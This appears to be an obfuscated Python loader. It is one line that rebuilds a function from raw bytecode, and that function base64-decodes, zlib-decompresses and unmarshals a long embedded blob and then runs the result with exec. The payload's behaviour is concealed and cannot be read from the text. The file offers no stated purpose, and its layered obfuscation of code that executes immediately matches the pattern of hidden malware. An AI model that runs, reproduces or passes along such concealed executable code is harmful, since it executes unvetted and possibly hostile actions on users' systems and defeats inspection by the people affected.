_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z\x16e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00d\x04S\x00\x04\x00e\x05y/\x01\x00Z\x06\x01\x00z\re\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x00Y\x00d\x04Z\x06[\x06d\x04S\x00d\x04Z\x06[\x06w\x01w\x00',('marshal', 'zlib', 'base64', b'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', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'Lambda.py','<module>',1,b'.\x01',(),());_()
